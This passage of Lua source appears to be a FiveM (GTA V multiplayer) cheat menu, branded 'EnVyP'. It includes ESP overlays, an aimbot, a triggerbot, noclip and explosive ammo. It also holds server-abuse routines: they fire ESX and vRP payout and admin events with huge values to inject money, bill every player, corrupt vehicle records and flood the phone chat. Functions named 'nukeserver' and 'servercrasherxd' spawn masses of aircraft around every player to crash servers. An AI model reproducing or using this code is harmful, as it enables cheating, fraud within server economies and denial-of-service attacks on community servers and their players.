                  distance = math.floor(GetDistanceBetweenCoords(cx,  cy,  cz,  x,  y,  z,  true))
                  if specwarning then 
                    if (distance < 35) then   
                      DrawTxt("~h~~r~SOMEONE IS NEAR!!!", 0.44, 0.05)
                    end
                  end
                  if ((distance < disPlayerNames)) then
                    if NetworkIsPlayerTalking( i ) then
                      DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), ra.r,ra.g,ra.b)
                    else
                      DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), 255,255,255)
                    end
                  end
                end
                local message =
                "Name: " ..
                GetPlayerName(i) ..
                "\nServer ID: " ..
                GetPlayerServerId(i) ..
                "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                if IsPedInAnyVehicle(pPed, true) then
                  local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                  message = message .. "\nVeh: " .. VehName
                end
                if ((distance < disPlayerNamesz)) then
                  if espinfo and esp then
                    DrawText3D(x, y, z - 1.0, message, ra.r, ra.g, ra.b)
                  end
                  if espbox and esp then
                    LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                    LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                    LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                    LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                    LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                    LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                    LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                    TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                    TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                    TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                    TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                    TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                    TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                    TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                    ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                    ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                    ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                    ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                    ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                    ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                    ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                    ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                    DrawLine(
                    LineOneBegin.x,
                    LineOneBegin.y,
                    LineOneBegin.z,
                    LineOneEnd.x,
                    LineOneEnd.y,
                    LineOneEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    LineTwoBegin.x,
                    LineTwoBegin.y,
                    LineTwoBegin.z,
                    LineTwoEnd.x,
                    LineTwoEnd.y,
                    LineTwoEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    LineThreeBegin.x,
                    LineThreeBegin.y,
                    LineThreeBegin.z,
                    LineThreeEnd.x,
                    LineThreeEnd.y,
                    LineThreeEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    LineThreeEnd.x,
                    LineThreeEnd.y,
                    LineThreeEnd.z,
                    LineFourBegin.x,
                    LineFourBegin.y,
                    LineFourBegin.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    TLineOneBegin.x,
                    TLineOneBegin.y,
                    TLineOneBegin.z,
                    TLineOneEnd.x,
                    TLineOneEnd.y,
                    TLineOneEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    TLineTwoBegin.x,
                    TLineTwoBegin.y,
                    TLineTwoBegin.z,
                    TLineTwoEnd.x,
                    TLineTwoEnd.y,
                    TLineTwoEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    TLineThreeBegin.x,
                    TLineThreeBegin.y,
                    TLineThreeBegin.z,
                    TLineThreeEnd.x,
                    TLineThreeEnd.y,
                    TLineThreeEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    TLineThreeEnd.x,
                    TLineThreeEnd.y,
                    TLineThreeEnd.z,
                    TLineFourBegin.x,
                    TLineFourBegin.y,
                    TLineFourBegin.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    ConnectorOneBegin.x,
                    ConnectorOneBegin.y,
                    ConnectorOneBegin.z,
                    ConnectorOneEnd.x,
                    ConnectorOneEnd.y,
                    ConnectorOneEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    ConnectorTwoBegin.x,
                    ConnectorTwoBegin.y,
                    ConnectorTwoBegin.z,
                    ConnectorTwoEnd.x,
                    ConnectorTwoEnd.y,
                    ConnectorTwoEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    ConnectorThreeBegin.x,
                    ConnectorThreeBegin.y,
                    ConnectorThreeBegin.z,
                    ConnectorThreeEnd.x,
                    ConnectorThreeEnd.y,
                    ConnectorThreeEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                    DrawLine(
                    ConnectorFourBegin.x,
                    ConnectorFourBegin.y,
                    ConnectorFourBegin.z,
                    ConnectorFourEnd.x,
                    ConnectorFourEnd.y,
                    ConnectorFourEnd.z,
                    ra.r,
                    ra.g,
                    ra.b,
                    255
                    )
                  end
                  if esplines and esp then
                    DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                  end
                end
              end
            end
          end

          if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
          end

          if waterp and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
          end

          if oneshot then
            SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
            local gotEntity = getEntity(PlayerId(-1))
            if IsEntityAPed(gotEntity) then
              if IsPedInAnyVehicle(gotEntity, true) then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                  if IsControlJustReleased(1, 69) then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                  end
                else
                  if IsControlJustReleased(1, 142) and oneshotcar then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                  end
                end
              end
            end
          else
            SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
          end

          if crosshair then
            ShowHudComponentThisFrame(14)
          end

          if crosshairc then
            DrawTxt("~r~+", 0.495, 0.484)
          end

          if crosshairc2 then
            DrawTxt("~r~.", 0.4968, 0.478)
          end

          if dio then
            DoJesusTick(JesusRadius)
          end


          if showCoords then
            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
            roundx = tonumber(string.format("%.2f", x))
            roundy = tonumber(string.format("%.2f", y))
            roundz = tonumber(string.format("%.2f", z))

            DrawTxt("~r~X:~s~ "..roundx, 0.05, 0.00)
            DrawTxt("~r~Y:~s~ "..roundy, 0.13, 0.00)
            DrawTxt("~r~Z:~s~ "..roundz, 0.20, 0.00)
          end

          function automaticmoneyesx()
            local result = KeyboardInput("Warning, this value can be multiplied!!!", "", 100)
            if result ~= "" then
              local confirm = KeyboardInput("Are you sure? y/n", "", 0)
              if confirm == "y" then
                notify("~g~Testing all ~y~ESX ~g~scripts~s~.", true)
                TSE("esx_carthief:pay", result)
                TSE("esx_jobs:caution", "give_back", result)
                TSE("esx_fueldelivery:pay", result)
                TSE("esx_carthief:pay", result)
                TSE("esx_godirtyjob:pay", result)
                TSE("esx_pizza:pay", result)
                TSE("esx_ranger:pay", result)
                TSE("esx_garbagejob:pay", result)
                TSE("esx_truckerjob:pay", result)
                TSE("AdminMenu:giveBank", result)
                TSE("AdminMenu:giveCash", result)
                TSE("esx_gopostaljob:pay", result)
                TSE("esx_banksecurity:pay", result)
                TSE("esx_slotmachine:sv:2", result)
              elseif confirm == "n" then
                notify("~b~Operation cancelled~s~.", false)
              else
                notify("~b~Invalid Confirmation~s~.", true)
                notify("~b~Operation cancelled~s~.", false)
              end
            end
          end

          function vrpdestroy()
            for c = 0, 9 do
              TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."EnVyP Community - Hello guys!")
            end
            TSE("lscustoms:payGarage", {costs = -99999999})
            TSE("vrp_slotmachine:server:2",999999999)
            TSE("bank:deposit", 999999999)
            for i=0,1000 do
              TSE('paycheck:bonus')
              TSE('paycheck:salary')
            end
            local q = 99999
            for k= 1,3000 do
              TSE("bank:transfer", k, q)
            end
          end

          if vrpdbc then
            for i=0,10 do
              for veh in EnumerateVehicles() do
                Citizen.InvokeNative(0xAD738C3085FE7E11, veh, true, true)

                if DoesEntityExist(veh) then
                  local colors = "asdrubale"
                  local extra_colors = "asdrubale"
                  local neoncolor = "asdrubale"
                  local mods = "asdrubale"
                  local smokecolor = "asdrubale"
                  local plate = math.random(1,999999)
                  local plateindex = "asdrubale"
                  local primarycolor = "asdrubale"
                  local secondarycolor = "asdrubale"
                  local pearlescentcolor = "asdrubale"
                  local wheelcolor = "asdrubale"
                  local neoncolor1 = "asdrubale"
                  local neoncolor2 = "asdrubale"
                  local neoncolor3 = "asdrubale"
                  local windowtint = "asdrubale"
                  local wheeltype = "asdrubale"
                  local smokecolor1 = "asdrubale"
                  local smokecolor2 = "asdrubale"
                  local smokecolor3 = "asdrubale"
                  local mods0 = "asdrubale"
                  local mods1 = "asdrubale"
                  local mods2 = "asdrubale"
                  local mods3 = "asdrubale"
                  local mods4 = "asdrubale"
                  local mods5 = "asdrubale"
                  local mods6 = "asdrubale"
                  local mods7 = "asdrubale"
                  local mods8 = "asdrubale"
                  local mods9 = "asdrubale"
                  local mods10 ="asdrubale"
                  local mods11 = "asdrubale"
                  local mods12 = "asdrubale"
                  local mods13 = "asdrubale"
                  local mods14 = "asdrubale"
                  local mods15 = "asdrubale"
                  local mods16 = "asdrubale"
                  local mods23 = "asdrubale"
                  local mods24 = "asdrubale"
                  local turbo = "asdrubale"
                  local tiresmoke = "asdrubale"
                  local xenon = "asdrubale"
                  local neon1 = "asdrubale"
                  local neon2 = "asdrubale"
                  local neon3 = "asdrubale"
                  local bulletproof = "asdrubale"
                  local variation = "asdrubale"
                  TriggerServerEvent('lscustoms:UpdateVeh', vehicle, plate, plateindex,primarycolor,secondarycolor,pearlescentcolor,wheelcolor,neoncolor1,neoncolor2,neoncolor3,windowtint,wheeltype,mods0,mods1,mods2,mods3,mods4,mods5,mods6,mods7,mods8,mods9,mods10,mods11,mods12,mods13,mods14,mods15,mods16,turbo,tiresmoke,xenon,mods23,mods24,neon0,neon1,neon2,neon3,bulletproof,smokecolor1,smokecolor2,smokecolor3,variation)
                end
              end
            end
          end

          if gcphonedestroy then
            local numBase0 = math.random(100,999)
            local numBase1 = math.random(0,9999)
            local num = string.format("%03d-%04d", numBase0, numBase1 )
            local num2 = string.format("%03d-%04d", numBase0, numBase1 )
            local transmitter = num
            local receiver = num2
            local message = "我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地"
            local owner = math.random(0,1)
            local sourcePlayer = math.random(0,87)
            local channel = num
            local messages = message..message..message..message..message..message..message..message
            local phone_number = num
            TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, messages, owner)
            TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
          end

          if haharip then
            esxdestroyv3()
            nukeserver()
            vrpdestroy()
          end

          function esxdestroyv3()
            TSE("esx_jobs:caution", "give_back", 9999999999)
            TSE("esx_fueldelivery:pay", 9999999999)
            TSE("esx_carthief:pay", 9999999999)
            TSE("esx_godirtyjob:pay", 9999999999)
            TSE("esx_pizza:pay", 9999999999)
            TSE("esx_ranger:pay", 9999999999)
            TSE("esx_garbagejob:pay", 9999999999)
            TSE("esx_truckerjob:pay", 9999999999)
            TSE("AdminMenu:giveBank", 9999999999)
            TSE("AdminMenu:giveCash", 9999999999)
            TSE("esx_gopostaljob:pay", 9999999999)
            TSE("esx_banksecurity:pay", 9999999999)
            TSE("esx_slotmachine:sv:2", 9999999999)
            for c = 0, 9 do

              TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."EnVyP Community - Hello guys!")
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do
              TSE("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 101337)
              TSE("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "EnVyP10 is here LOL", 13374316)
            end
          end

          function nukeserver()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            for i=0,128 do
              CreateVehicle(GetHashKey(camion),GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true)
              CreateVehicle(GetHashKey(avion),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
              CreateVehicle(GetHashKey(avion2),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
              CreateVehicle(GetHashKey(heli),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
              CreateVehicle(GetHashKey(random),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
            end
          end

          if servercrasherxd then
            Citizen.CreateThread(function()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do

              for a = 100, 150 do
                local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true)
              end
            end
            end)
          end

          if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            if IsControlPressed(0, 209) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0)
            elseif IsControlPressed(0, 210) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
            end
          end

          if TriggerBot then
            local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
            if Aiming then
              if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                ShootPlayer(Entity)
              end
            end
          end

          if Aimlock then
            SetPlayerLockon(PlayerId(), false)
            SetPlayerTargetingMode(1)
            SetPlayerLockonRangeOverride(PlayerId(),9999)
          end

          if Aimbot then
            for player=1, 128 do
              if player ~= PlayerId() then
                if IsPlayerFreeAiming(PlayerId()) then
                  local TargetPed = GetPlayerPed(player)
                  local TargetPos = GetEntityCoords(TargetPed)
                  local Exist = DoesEntityExist(TargetPed)
                  local Dead = IsPlayerDead(TargetPed)

                  if Exist and not Dead then
                    local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                    if IsEntityVisible(TargetPed) and OnScreen then
                      if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                      end
                    end
                  end
                end
              end
            end
          end

          if ragebot then
            for player=1, 128 do
              if player ~= PlayerId() then
                local TargetPed = GetPlayerPed(player)
                local TargetPos = GetEntityCoords(TargetPed)
                local Exist = DoesEntityExist(TargetPed)
                local Dead = IsPlayerDead(TargetPed)

                if Exist and not Dead then
                  local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                  if IsEntityVisible(TargetPed) and OnScreen then
                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                      local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                      SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                    end
                  end
                end
              end
            end
          end


          if rapidfire then
            DRFT()
          end

          if explosiveammo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
              AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
          end

          if RainbowVeh then
            Citizen.Wait(0)
            local rgb = RGB(1.0)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
          end

          if rainbowh then
            for i = -1, 12 do
              Citizen.Wait(0)
              local ra = RGB(1.0)
              SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
              SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
              if i == 12 then
                i = -1
              end
            end
          end

          if t2x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
          end

          if t4x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
          end

          if t10x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
          end

          if t16x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
          end

          if txd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
          end

          if tbxd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
          end

          if Noclip then
            DrawTxt("NOCLIP ~g~ON", 0.70, 0.9)
            local currentSpeed = 2
            local noclipEntity =
            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
            FreezeEntityPosition(PlayerPedId(-1), true)
            SetEntityInvincible(PlayerPedId(-1), true)

            local newPos = GetEntityCoords(entity)

            DisableControlAction(0, 32, true)
            DisableControlAction(0, 268, true)

            DisableControlAction(0, 31, true)

            DisableControlAction(0, 269, true)
            DisableControlAction(0, 33, true)

            DisableControlAction(0, 266, true)
            DisableControlAction(0, 34, true)

            DisableControlAction(0, 30, true)

            DisableControlAction(0, 267, true)
            DisableControlAction(0, 35, true)

            DisableControlAction(0, 44, true)
            DisableControlAction(0, 20, true)

            local yoff = 0.0
            local zoff = 0.0

            if GetInputMode() == "MouseAndKeyboard" then
              if IsDisabledControlPressed(0, 32) then
                yoff = 0.5
              end
              if IsDisabledControlPressed(0, 33) then
                yoff = -0.5
              end
              if IsDisabledControlPressed(0, 34) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
              end
              if IsDisabledControlPressed(0, 35) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
              end
              if IsDisabledControlPressed(0, 44) then
                zoff = 0.21
              end
              if IsDisabledControlPressed(0, 20) then
                zoff = -0.21
              end
            end

            newPos =
            GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

            local heading = GetEntityHeading(noclipEntity)
            SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
            SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
            SetEntityHeading(noclipEntity, heading)

            SetEntityCollision(noclipEntity, false, false)
            SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

            FreezeEntityPosition(noclipEntity, false)
            SetEntityInvincible(noclipEntity, false)
            SetEntityCollision(noclipEntity, true, true)
          end
        end
        end)

        Citizen.CreateThread(function()
        FreezeEntityPosition(entity, false)
        local playerIdxWeapon = 1;
        local WeaponTypeSelect = nil
        local WeaponSelected = nil
        local ModSelected = nil
        local currentItemIndex = 1
        local selectedItemIndex = 1
        local powerboost = { 1.0, 2.0, 4.0, 10.0, 512.0, 9999.0 }
        local spawninside = false
        JesusRadius = 5.0
        PedAttackType = 1
        JesusRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
        PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}
        local currJesusRadiusIndex = 1
        local selJesusRadiusIndex = 1
        local currAttackTypeIndex = 1
        local selAttackTypeIndex = 1
        EVP.CreateMenu(EnVyPIcS, EnVyPIcZ)
        EVP.CreateSubMenu(sMX, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(CHAR, sMX, envypxd)
        EVP.CreateSubMenu(TRPM, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(WMPS, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(advm, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(LMX, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(VMS, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(OPMS, EnVyPIcS, envypxd)
        EVP.CreateSubMenu(poms, OPMS, envypxd)
        EVP.CreateSubMenu(dddd, advm, envypxd)
        EVP.CreateSubMenu(esms, LMX, envypxd)
        EVP.CreateSubMenu(ESXD, LMX, envypxd)
        EVP.CreateSubMenu(ESXC, LMX, envypxd)
        EVP.CreateSubMenu(VRPT, LMX, envypxd)
        EVP.CreateSubMenu(MSTC, LMX, envypxd)
        EVP.CreateSubMenu(Tmas, poms, envypxd)
        EVP.CreateSubMenu(WTNe, WMPS, envypxd)
        EVP.CreateSubMenu(WTSbull, WTNe, envypxd)
        EVP.CreateSubMenu(WOP, WTSbull, envypxd)
